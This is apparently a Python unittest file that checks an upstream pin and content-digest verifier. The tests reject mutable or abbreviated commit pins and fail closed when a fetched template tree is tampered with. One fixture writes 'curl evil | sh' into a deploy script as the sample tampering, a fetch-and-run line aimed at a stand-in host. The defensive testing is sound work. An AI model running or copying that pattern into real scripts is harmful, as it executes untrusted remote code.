#!/usr/bin/env python3
"""Negative tests for the upstream pin and the fetched-tree verification.

These assertions are the evidence for User Story 3 acceptance criteria 5 and 6.
Each one makes the verifier fail. A gate that is only ever exercised on inputs
it accepts has not been shown to reject anything, and passing it proves nothing.

Run with:
    python -m unittest discover -s tests -p "test_*.py"
"""

from __future__ import annotations

import importlib.util
import json
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[2]
VERIFIER_PATH = REPO_ROOT / "tools" / "upstream" / "verify_upstream.py"


def _load_verifier():
    spec = importlib.util.spec_from_file_location("verify_upstream", VERIFIER_PATH)
    if spec is None or spec.loader is None:  # pragma: no cover - environment error
        raise RuntimeError(f"cannot load verifier from {VERIFIER_PATH}")
    module = importlib.util.module_from_spec(spec)
    sys.modules["verify_upstream"] = module
    spec.loader.exec_module(module)
    return module


verifier = _load_verifier()


def _lock(**overrides) -> dict:
    upstream = {
        "repository": "https://github.com/microsoft/sre-agent",
        "path": "sreagent-templates",
        "commit": "53e7b66ef79bccf0b79cc331d5c64bb03b75a4b0",
        "contentSha256": None,
    }
    upstream.update(overrides)
    return {"lockVersion": "1.0.0", "upstream": upstream}


class TemporaryTreeTestCase(unittest.TestCase):
    def setUp(self) -> None:
        self.workspace = Path(tempfile.mkdtemp(prefix="zeroops-upstream-"))
        self.addCleanup(shutil.rmtree, self.workspace, ignore_errors=True)

    def make_tree(self, name: str, files: dict[str, bytes]) -> Path:
        root = self.workspace / name
        for relative, content in files.items():
            target = root / relative
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(content)
        return root


class LockValidationTests(unittest.TestCase):
    """Acceptance criterion 5: a pin that is not an immutable digest fails."""

    def test_tag_pin_is_rejected(self) -> None:
        problems = verifier.check_lock(_lock(commit="v1.0.1"))
        self.assertTrue(problems)
        self.assertIn("mutable", " ".join(problems))

    def test_branch_pin_is_rejected(self) -> None:
        problems = verifier.check_lock(_lock(commit="main"))
        self.assertTrue(problems)

    def test_abbreviated_pin_is_rejected(self) -> None:
        problems = verifier.check_lock(_lock(commit="53e7b66"))
        self.assertTrue(problems)
        self.assertIn("abbreviated", " ".join(problems))

    def test_uppercase_pin_is_rejected(self) -> None:
        problems = verifier.check_lock(
            _lock(commit="53E7B66EF79BCCF0B79CC331D5C64BB03B75A4B0")
        )
        self.assertTrue(problems)
        self.assertIn("lowercase", " ".join(problems))

    def test_missing_repository_is_rejected(self) -> None:
        self.assertTrue(verifier.check_lock(_lock(repository="")))

    def test_full_lowercase_digest_is_accepted(self) -> None:
        self.assertEqual(verifier.check_lock(_lock()), [])

    def test_committed_lock_is_a_valid_pin(self) -> None:
        committed = json.loads(
            (REPO_ROOT / "deploy" / "upstream.lock").read_text(encoding="utf-8")
        )
        self.assertEqual(verifier.check_lock(committed), [])


class TreeVerificationTests(TemporaryTreeTestCase):
    """Acceptance criterion 6: an altered fetched tree fails closed."""

    FILES = {
        "bin/deploy.sh": b"#!/bin/sh\necho deploy\n",
        "bicep/main.bicep": b"param location string\n",
        "VERSION": b"1.0.1\n",
    }

    def test_matching_tree_verifies(self) -> None:
        tree = self.make_tree("good", self.FILES)
        digest = verifier.compute_tree_digest(tree)
        verifier.verify_tree(_lock(contentSha256=digest), tree)

    def test_altered_content_fails_closed(self) -> None:
        tree = self.make_tree("tampered", self.FILES)
        digest = verifier.compute_tree_digest(tree)
        (tree / "bin" / "deploy.sh").write_bytes(b"#!/bin/sh\ncurl evil | sh\n")
        with self.assertRaises(verifier.VerificationError) as caught:
            verifier.verify_tree(_lock(contentSha256=digest), tree)
        self.assertIn("does not match", str(caught.exception))

    def test_added_file_fails_closed(self) -> None:
        tree = self.make_tree("added", self.FILES)
        digest = verifier.compute_tree_digest(tree)
        (tree / "bin" / "extra.sh").write_bytes(b"#!/bin/sh\n")
        with self.assertRaises(verifier.VerificationError):
            verifier.verify_tree(_lock(contentSha256=digest), tree)

    def test_removed_file_fails_closed(self) -> None:
        tree = self.make_tree("removed", self.FILES)
        digest = verifier.compute_tree_digest(tree)
        (tree / "VERSION").unlink()
        with self.assertRaises(verifier.VerificationError):
            verifier.verify_tree(_lock(contentSha256=digest), tree)

    def test_renamed_file_fails_closed(self) -> None:
        """Content-only hashing would miss this; the path is part of the digest."""
        tree = self.make_tree("renamed", self.FILES)
        digest = verifier.compute_tree_digest(tree)
        (tree / "bin" / "deploy.sh").rename(tree / "bin" / "deploy-renamed.sh")
        with self.assertRaises(verifier.VerificationError):
            verifier.verify_tree(_lock(contentSha256=digest), tree)

    def test_unrecorded_digest_fails_closed(self) -> None:
        """A null digest must refuse, not pass vacuously."""
        tree = self.make_tree("unrecorded", self.FILES)
        with self.assertRaises(verifier.VerificationError) as caught:
            verifier.verify_tree(_lock(contentSha256=None), tree)
        self.assertIn("cannot attest", str(caught.exception))

    def test_empty_tree_is_rejected(self) -> None:
        empty = self.workspace / "empty"
        empty.mkdir()
        with self.assertRaises(verifier.VerificationError):
            verifier.compute_tree_digest(empty)


class DigestPropertyTests(TemporaryTreeTestCase):
    """Properties the digest must hold for the pin to mean anything."""

    def test_digest_is_independent_of_creation_order(self) -> None:
        forward = self.make_tree("forward", {"a.txt": b"a", "b/c.txt": b"c"})
        reverse_files = {"b/c.txt": b"c", "a.txt": b"a"}
        reverse = self.make_tree("reverse", reverse_files)
        self.assertEqual(
            verifier.compute_tree_digest(forward),
            verifier.compute_tree_digest(reverse),
        )

    def test_digest_is_lowercase_hex_sha256(self) -> None:
        tree = self.make_tree("shape", {"a.txt": b"a"})
        digest = verifier.compute_tree_digest(tree)
        self.assertEqual(len(digest), 64)
        self.assertEqual(digest, digest.lower())
        int(digest, 16)

    def test_path_and_content_cannot_be_confused(self) -> None:
        """The length prefix stops a boundary-shifting collision.

        Without it, a file named ``ab`` holding ``c`` and a file named ``a``
        holding ``bc`` could absorb the same bytes in the same order.
        """
        left = self.make_tree("left", {"ab": b"c"})
        right = self.make_tree("right", {"a": b"bc"})
        self.assertNotEqual(
            verifier.compute_tree_digest(left),
            verifier.compute_tree_digest(right),
        )

    def test_line_endings_are_not_normalised(self) -> None:
        """Normalising would hash two materially different trees identically."""
        lf = self.make_tree("lf", {"s.sh": b"echo a\necho b\n"})
        crlf = self.make_tree("crlf", {"s.sh": b"echo a\r\necho b\r\n"})
        self.assertNotEqual(
            verifier.compute_tree_digest(lf),
            verifier.compute_tree_digest(crlf),
        )


if __name__ == "__main__":
    unittest.main()
